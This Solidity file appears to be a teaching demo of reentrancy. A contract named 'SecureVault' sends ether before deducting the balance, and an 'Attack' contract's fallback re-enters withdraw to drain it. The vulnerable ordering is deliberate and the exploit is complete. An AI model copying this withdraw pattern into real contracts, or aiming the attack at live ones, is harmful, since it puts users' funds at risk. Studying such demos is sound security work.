// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.7.0;

// the contract dictating the storage all the ether
contract SecureVault{

    mapping(address => uint) public balances;

    // deposits the ether    
    function deposit() public payable { balances[msg.sender] += msg.value; }
    
    // withdraws the ether from the collective storage
    function withdraw(uint _amount) public {
        require(balances[msg.sender] >= _amount);
        
        // sends the money to the requester
        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");
        
        // deducts the amount
        balances[msg.sender] -= _amount;
    }
    
    // returns the total storage
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    // instance of the contract
    SecureVault public securevault;

    // initialising the instance
    constructor(address _secureVaultAddress) public {
        securevault = SecureVault(_secureVaultAddress);
    }

    // when the withdraw function is called above, 
    // this function is to whom the ether is returned to.
    fallback() external payable {
        if (address(securevault).balance >= 1 wei) {
            securevault.withdraw(1 wei);
        }
    }

    // initiates the attack
    function attack() external payable {
        require(msg.value >= 1 wei);
        securevault.deposit{value: 1 wei}();
        securevault.withdraw(1 wei);
    }

    // returns the balance of the current contract total.
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
